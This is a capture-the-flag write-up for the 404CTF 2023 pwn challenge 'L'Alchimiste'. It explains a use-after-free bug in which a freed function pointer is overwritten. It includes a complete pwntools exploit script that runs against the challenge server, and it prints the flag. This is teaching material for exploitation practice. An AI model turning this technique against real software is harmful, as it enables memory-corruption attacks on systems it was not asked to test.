---
title: CTFs | 404CTF_2023 | Pwn | L'Alchimiste
author: BatBato
date: 2023-06-08
categories: [CTFs, 404CTF_2023, Pwn]
tags: [Pwn, Ghidra, BoF, Use After Free]
permalink: /CTFs/404CTF_2023/Pwn/L_Alchimiste
---

# L'Alchimiste

![image](https://github.com/Nouman404/nouman404.github.io/assets/73934639/06a3eb5c-571f-41f9-93c9-5b7d9914e6df)

For this challenge, we are given [this](https://github.com/Nouman404/nouman404.github.io/blob/main/_posts/CTFs/404CTF_2023/Reverse/l_alchimiste) executable. We can open it on Ghidra and/or run it to understand how it works.

![image](https://github.com/Nouman404/nouman404.github.io/assets/73934639/94c5dae2-5430-47cc-b15f-062c27f5f2d4)

As we can see, we have multiple options. I first tried to buy a strength potion and to use it multiple time:

![image](https://github.com/Nouman404/nouman404.github.io/assets/73934639/c07af379-31f3-4391-aded-708134021734)

As we can see, we have a double free error. This is because, when we use the strength potion, we call the `useItem` function that does the following:

![image](https://github.com/Nouman404/nouman404.github.io/assets/73934639/353f2dfe-6e0a-4cee-b309-1f5092735677)

As we can see, we free the memory at the location of `param_1+0x10`. If we look at the character creation, we can see that it is the address of the function located after the initial parameter:

![image](https://github.com/Nouman404/nouman404.github.io/assets/73934639/90bd0a23-ad3d-48b4-998e-411d2423819a)

> `param1` is the strength, `param2` is the intelligence and param3 is the gold.
{: .prompt-info}

To better understand why this is a function, we can look at the `buyStrUpPotion` function:

![image](https://github.com/Nouman404/nouman404.github.io/assets/73934639/02b7b3ce-76c8-4099-a7db-67c2d2230dde)

As we can see, we set `puVar1` some values and the last value of `puVar1` is the function `incStr` that increase the strength by 10. We can also notice that the function `incStr` is set even if we don't have enough money to buy the strength potion. So we can use repeatedly the option `1` to buy the potion and then use the option with the option `2`. This will allow us to get any amount of strength we want:

![image](https://github.com/Nouman404/nouman404.github.io/assets/73934639/feec0b73-d79f-4137-8ab6-4a30915e84e1)

As we can see, we now have 230 of strength. Let's have a look at how to get the flag... This is what we are here fore XD:

![image](https://github.com/Nouman404/nouman404.github.io/assets/73934639/f90e8daa-a620-422c-b01b-69974267ee73)


As we cans see, we need `*param_1 >= 0x96` and `param[1] >= 0x96` where `0x96` is equal to `150` in decimal and those parameters are the strength and the intelligence as we saw earlier.

> Note that `*param` <=> `param_1[0]`.
{: .prompt-info}

We have solved the problem of the strength, but what about the intelligence??? There is no function in the program that calls the `incInt` to do the same thing as for the strength...

After a bit of digging, I found something called `use after free`. As we saw earlier, the memory is free when we call the `useItem` function, but the memory is not set as null before. This is great, at least for us XD.

We now can try to override the address of the function `incStr` with the address of `incInt` after the free of the `useItem`. If we manage to do so, the address of `incInt` will be at the same memory location than the previous `incStr`. Then the call of `useItem` will think that it is calling the `incStr` but it will be calling `incInt`.

Let's see how to this now. For that we need to head back to the `buyStrPotion`. This function will set the address of the `incStr` function int `puVar1[8]` but if we look at the assembly code, we can see that it is at the position `+0x40`.

![image](https://github.com/Nouman404/nouman404.github.io/assets/73934639/2f3380e8-8b75-40c1-b80f-56535e608d66)

We can then try to override the first `64` (`0x40`) characters and then put the address of `incInt` that can be found in Ghidra.

The final code I used is the following:

```python
from pwn import *
warnings.filterwarnings("ignore", category=BytesWarning)
#io = process("./l_alchimiste")
HOST, PORT = "challenges.404ctf.fr", 30944 
io = remote(HOST, PORT)

def getStrength():
	io.recvuntil(">>> ")
	io.sendline("2")
	io.recvuntil(">>> ")
	io.sendline("1")

def checkStrength():
	io.recvuntil(">>> ")
	io.sendline("4")
	text = io.recvuntil("1:")
	print(text)
	if b"FOR: 160" in text:
		return 1
	else:
		return 0

def setInteligence():
	io.recvuntil(">>> ")
	io.sendline("2")

	io.recvuntil(">>> ")
	io.sendline("3")
	io.recvuntil("[Vous] : ")
	io.sendline(b"a"*0x40+p64(0x004008d5))

	io.recvuntil(">>> ")
	io.sendline("1")

def checkInteligence():
	io.recvuntil(">>> ")
	io.sendline("4")
	text = io.recvuntil("1:")
	print(text)
	if b"INT: 160" in text:
		return 1
	else:
		return 0

io.recvuntil(">>> ")
io.sendline("1")
okStr = 0
while okStr != 1:
	getStrength()
	okStr = checkStrength()

okInt = 0 
while okInt != 1:
	okInt = checkInteligence()
	setInteligence()
io.recvuntil(">>> ")
io.sendline("5")
print(io.recvline().decode())
print(io.recvline().decode())
print("Flag: ", io.recvline().decode())
```

If we run it locally, we get:

![image](https://github.com/Nouman404/nouman404.github.io/assets/73934639/f1ef2eed-9294-4934-ad80-88cd4a81f5cc)

As we can see, we get the test flag we created. We can now run it on the remote host and get the flag:

![image](https://github.com/Nouman404/nouman404.github.io/assets/73934639/dd33e70d-8bae-4e3b-b5cf-7991f7eb2607)


The flag is `404CTF{P0UrQU01_P4Y3r_QU4ND_135_M075_5UFF153N7}`

